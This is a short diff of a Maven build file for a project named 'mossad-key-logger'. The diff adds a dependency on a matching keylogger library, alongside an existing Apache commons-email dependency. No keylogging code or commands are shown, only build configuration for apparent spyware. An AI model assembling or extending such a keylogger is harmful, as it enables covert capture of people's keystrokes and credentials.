@@ -11,7 +11,11 @@
     <artifactId>mossad-key-logger</artifactId>
 
     <dependencies>
-
+        <dependency>
+            <groupId>mossad</groupId>
+            <artifactId>mossad-key-logger-library</artifactId>
+            <version>1.0-SNAPSHOT</version>
+        </dependency>
         <dependency>
             <groupId>org.apache.commons</groupId>
             <artifactId>commons-email</artifactId>
